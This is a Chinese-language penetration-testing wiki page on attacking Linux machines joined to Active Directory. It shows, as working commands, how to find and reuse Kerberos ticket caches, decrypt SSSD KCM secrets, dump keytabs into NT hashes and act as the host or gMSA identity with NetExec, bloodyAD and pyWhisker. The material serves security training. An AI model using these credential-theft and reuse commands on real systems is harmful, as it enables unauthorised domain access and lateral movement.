# Linux Active Directory

{{#include ../../banners/hacktricks-training.md}}

Linux machine 也可能存在于 Active Directory 环境中。

AD 中的 Linux machine 可以**在本地存储 Kerberos material**：用户 ccaches、machine/service keytabs 以及由 SSSD 管理的 secrets。这些 artefacts 通常可以像其他 Kerberos credential 一样重复使用。要读取其中的大多数内容，你需要是 ticket 的用户所有者，或在该 machine 上拥有 **root** 权限。<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

## 枚举

### Linux 上的 AD 枚举

如果你可以从 Linux 上访问 AD（或在 Windows 中使用 bash），可以尝试 [https://github.com/lefayjey/linWinPwn](https://github.com/lefayjey/linWinPwn) 来枚举 AD。

你也可以查看以下页面，了解**从 Linux 枚举 AD 的其他方式**：


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

### FreeIPA

FreeIPA 是 Microsoft Windows **Active Directory** 的开源**替代方案**，主要用于 **Unix** 环境。它将完整的 **LDAP directory** 与 MIT **Kerberos** Key Distribution Center 结合，用于执行类似 Active Directory 的管理。它使用 Dogtag **Certificate System** 管理 CA 和 RA certificate，支持包括 smartcards 在内的**多因素** authentication。SSSD 集成用于 Unix authentication processes。<sup>[[14]](#references)[[15]](#references)</sup> 在以下页面了解更多信息：


{{#ref}}
../software-information/freeipa-pentesting.md
{{#endref}}

### 加入域的 host artefacts

在处理 tickets 之前，先确定 **host 是如何加入 AD 的**，以及 **Kerberos material 实际存储在哪里**。在现代 Linux host 上，这通常由 `realmd` + `adcli` + `sssd` 处理，而不只是存储在 `/tmp` 中的普通文件。<sup>[[10]](#references)</sup>
```bash
# Is the host joined to a realm/domain?
realm list 2>/dev/null
adcli testjoin 2>/dev/null

# SSSD / Kerberos configuration
grep -R "ad_domain\|krb5_realm\|cache_credentials\|ldap_id_mapping" /etc/sssd/sssd.conf /etc/sssd/conf.d 2>/dev/null
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null

# Machine account and local Kerberos artefacts
klist -k /etc/krb5.keytab 2>/dev/null
find /var/lib/sss -maxdepth 3 \( -name '*.ldb' -o -name '.secrets.mkey' -o -name 'ccache_*' \) -ls 2>/dev/null
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null
```
这可以快速告诉你主机是否信任 AD、SSSD 是否在缓存身份或 tickets，以及是否存在可被滥用的 **machine/service keytabs** 或 **KCM secrets**。<sup>[[4]](#references)[[10]](#references)</sup>

## Playing with tickets

### Pass The Ticket

在本页中，你将找到 **在 Linux 主机中查找 kerberos tickets** 的不同位置；在以下页面中，你可以了解如何将这些 CCache ticket 格式转换为 Kirbi（在 Windows 中使用所需的格式），以及如何执行 PTT attack：


{{#ref}}
../../windows-hardening/active-directory-methodology/pass-the-ticket.md
{{#endref}}

如果你想了解 **Linux-specific ticket harvesting workflows**（`FILE`、`DIR`、`KEYRING`、`KCM`、`/proc` 等），请查看专门的页面：

{{#ref}}
../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md
{{#endref}}

### CCACHE ticket reuse from /tmp

CCACHE files 是用于 **存储 Kerberos credentials** 的二进制格式。`FILE:/tmp/krb5cc_%{uid}` 仍然很常见，但现代 Linux 部署也使用 `DIR:/run/user/%{uid}/krb5cc*`、`KEYRING:persistent:%{uid}` 或 `KCM:%{uid}`。在假设 tickets 位于 `/tmp` 之前，请检查 **`KRB5CCNAME`** 环境变量和 `default_ccache_name` 设置。<sup>[[1]](#references)[[3]](#references)</sup>
```bash
# Where is the current process reading credentials from?
env | grep KRB5CCNAME
grep -R "default_ccache_name" /etc/krb5.conf /etc/krb5.conf.d 2>/dev/null
klist -l 2>/dev/null

# FILE / DIR caches commonly seen on joined Linux hosts
find /tmp /run/user -maxdepth 2 -name 'krb5cc*' -ls 2>/dev/null

# Prepare to reuse a FILE cache
export KRB5CCNAME=/tmp/krb5cc_1000
klist
```
### 从 keyring 重用 CCACHE ticket

**存储在进程内存中的 Kerberos tickets 可以被提取**，尤其是在禁用 machine 的 ptrace protection（`/proc/sys/kernel/yama/ptrace_scope`）时。用于此目的的一个实用 tool 位于 [https://github.com/TarlogicSecurity/tickey](https://github.com/TarlogicSecurity/tickey)，它通过注入 sessions 并将 tickets dump 到 `/tmp` 来实现提取。<sup>[[1]](#references)[[16]](#references)</sup>

要配置并使用此 tool，请按照以下步骤操作：
```bash
git clone https://github.com/TarlogicSecurity/tickey
cd tickey/tickey
make CONF=Release
/tmp/tickey -i
```
此过程将尝试注入各种 session，并通过按照 `__krb_UID.ccache` 的命名约定将提取的 tickets 存储在 `/tmp` 中来表示成功。<sup>[[1]](#references)</sup>

### 从 SSSD KCM 重用 CCACHE ticket

SSSD 会在路径 `/var/lib/sss/secrets/secrets.ldb` 中维护数据库副本。对应的 key 存储在路径 `/var/lib/sss/secrets/.secrets.mkey` 下的隐藏文件中。默认情况下，只有拥有 **root** 权限才能读取该 key。<sup>[[4]](#references)</sup>

使用 --database 和 --key 参数调用 **`SSSDKCMExtractor`** 将解析数据库并 **解密 secrets**。<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/fireeye/SSSDKCMExtractor
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
该 extractor 会打印原始 Kerberos JSON payload；在执行 pass-the-cache/pass-the-ticket 操作前，将其转换为可用的 ticket cache 或其他 ticket 格式。<sup>[[4]](#references)</sup>

### 快速 keytab 分析
```bash
# Inspect available principals and enctypes
klist -k -e /etc/krb5.keytab

# Request a TGT directly from the keytab
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist
```
### 从 /etc/krb5.keytab 提取账户

服务账户密钥对于以 root 权限运行的服务至关重要，并安全地存储在 **`/etc/krb5.keytab`** 文件中。这些密钥类似于服务的密码，因此必须严格保密。<sup>[[5]](#references)</sup>

要检查 keytab 文件的内容，可以使用 **`klist`**。在 Linux 上，`klist -k -K -e` 会打印 principals、密钥版本号、加密类型和原始密钥材料。如果密钥类型为 **23 / RC4-HMAC**，则该密钥值也是该 principal 的 **NT hash**。<sup>[[6]](#references)[[17]](#references)</sup>
```bash
klist -k -K -e /etc/krb5.keytab
# RC4-HMAC entries expose reusable NTLM material; AES entries do not
```
对于 Linux 用户，**`KeyTabExtract`** 提供提取 RC4 HMAC hash 的功能，可用于 NTLM hash reuse。请注意，只有当 keytab 仍包含 **etype 23 / RC4-HMAC** 密钥材料时，此方法才有帮助。在 **AES-only** 环境中，你可能无法获得可复用的 NT hash，但仍可以通过 Kerberos 使用 keytab 直接进行认证。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>
```bash
python3 keytabextract.py krb5.keytab
# Expected output varies based on hash availability
```
在 macOS 上，**`bifrost`** 可用作 keytab 文件分析工具。<sup>[[8]](#references)</sup>
```bash
./bifrost -action dump -source keytab -path /path/to/your/file
```
利用提取的账户和哈希信息，可以使用 **`NetExec`** 等工具与服务器建立连接。<sup>[[9]](#references)</sup>
```bash
# NTLM/RC4 material recovered from etype 23 entries
nxc smb 10.XXX.XXX.XXX -u 'ServiceAccount$' -H "HashPlaceholder" -d "YourDOMAIN"

# Or reuse a Kerberos cache directly
KRB5CCNAME=owned.ccache nxc smb <DC_FQDN> --use-kcache
```
### 重用 `/etc/krb5.keytab` 中的 machine account

在已加入域的 `realmd`/`adcli`/`sssd` 系统上，`/etc/krb5.keytab` 通常包含 **computer account** 以及一个或多个 **host/service principals**。如果你拥有 **root** 权限，不要直接 dump 它：使用 `klist -k` 列出的某个 principal 来请求 TGT，并以 Linux 主机本身的身份进行操作。<sup>[[10]](#references)</sup>
```bash
# Identify usable principals first
klist -k /etc/krb5.keytab

# Then request a TGT with one of the listed principals
kinit -k -t /etc/krb5.keytab 'host/web01.domain.local@DOMAIN.LOCAL'
klist

# Validate LDAP / service access using that machine identity
ldapwhoami -Y GSSAPI -H ldap://dc.domain.local
kvno ldap/dc.domain.local
```
这在 **computer object** 本身在 AD 中拥有委派权限，或主机被允许检索其他 secrets（例如 **gMSA**）时尤其有用。<sup>[[13]](#references)</sup>

### 使用 Linux-first AD tooling 重用窃取的 Kerberos 材料

获得有效的 `ccache` 或可用的 keytab 后，你可以**直接从 Linux**对 AD 执行操作，而无需先将所有内容转换为 Windows 格式。许多现代工具原生支持 `KRB5CCNAME` / Kerberos 身份验证。<sup>[[9]](#references)[[11]](#references)[[12]](#references)</sup>
```bash
# Reuse a stolen cache with bloodyAD for LDAP-side actions
KRB5CCNAME=owned.ccache bloodyAD -d corp.local -k --host dc.corp.local get object 'CN=Domain Admins,CN=Users,DC=corp,DC=local'

# Reuse the same cache with pyWhisker when you already have write access
KRB5CCNAME=owned.ccache python3 pywhisker.py -d corp.local -k --dc-ip dc.corp.local \
--target 'WEB01$' --action list
```
这是 **Linux post-exploitation** 与 **AD object abuse** 之间很好的衔接。对于对象级 abuse 路径本身，请查看：

{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

{{#ref}}
../../windows-hardening/active-directory-methodology/acl-persistence-abuse/shadow-credentials.md
{{#endref}}

### Linux gMSA / Managed Service Account artefacts

近期的 Linux 部署可以直接从 AD 使用 **Managed Service Accounts**。实际上，这意味着在 compromise 一个 Linux server 后，你可能不仅会找到 host keytab，还可能找到由 gMSA 生成的 **service-specific keytabs**。常见的检查位置包括 `/etc/gmsad.conf`、部署专用的 config files，以及 `/etc` 下其他的 `*.keytab` files。<sup>[[2]](#references)[[13]](#references)</sup>
```bash
# Look for gMSA-related configuration and extra keytabs
grep -R "gMSA_\|principal =\|keytab =" /etc/gmsad.conf /etc/gmsad.d 2>/dev/null
find /etc -maxdepth 2 -name '*.keytab' -ls 2>/dev/null

# Inspect the host keytab and any service keytab you find
klist -kt /etc/krb5.keytab
klist -kt /etc/service.keytab

# If a service/gMSA keytab exists, request a TGT with it
kinit -kt /etc/service.keytab 'svc_web$@DOMAIN.LOCAL'
klist
```
这会为绑定到该 gMSA 的 SPNs 提供一个可复用的 Kerberos 身份，**无需接触任何 Windows endpoint**。<sup>[[13]](#references)</sup> 对于在 AD 中获得更高权限后进行的**域端** gMSA/dMSA abuse，请参阅：

{{#ref}}
../../windows-hardening/active-directory-methodology/golden-dmsa-gmsa.md
{{#endref}}

## References

- [1] [Kerberos（II）：如何攻击 Kerberos？](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [2] [访问 AD 中的 managed service account – 将 RHEL 系统直接与 Active Directory 集成](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/8/html/integrating_rhel_systems_directly_with_windows_active_directory/assembly_accessing-ad-with-a-managed-service-account_integrating-rhel-systems-directly-with-active-directory)
- [3] [Kerberos 环境变量 – MIT Kerberos Documentation](https://web.mit.edu/Kerberos/krb5-latest/doc/user/user_config/kerberos.html)
- [4] [SSSDKCMExtractor](https://github.com/mandiant/SSSDKCMExtractor)
- [5] [keytab – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-latest/doc/basic/keytab_def.html)
- [6] [RFC 4757：Microsoft Windows 使用的 RC4-HMAC Kerberos 加密类型](https://www.rfc-editor.org/rfc/rfc4757)
- [7] [KeyTabExtract](https://github.com/sosdave/KeyTabExtract)
- [8] [bifrost](https://github.com/its-a-feature/bifrost)
- [9] [使用 Kerberos | NetExec](https://www.netexec.wiki/getting-started/using-kerberos)
- [10] [发现并加入 Identity Domains | Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html/windows_integration_guide/realmd-domain)
- [11] [bloodyAD User Guide](https://github.com/CravateRouge/bloodyAD/wiki/User-Guide)
- [12] [pyWhisker](https://github.com/ShutdownRepo/pywhisker)
- [13] [gmsad](https://github.com/cea-sec/gmsad)
- [14] [关于 | FreeIPA documentation](https://www.freeipa.org/About.html)
- [15] [FreeIPA 4.11.0 release notes](https://www.freeipa.org/release-notes/4-11-0.html)
- [16] [Yama – The Linux Kernel documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html)
- [17] [klist – MIT Kerberos Documentation](https://web.mit.edu/kerberos/krb5-current/doc/user/user_commands/klist.html)
{{#include ../../banners/hacktricks-training.md}}
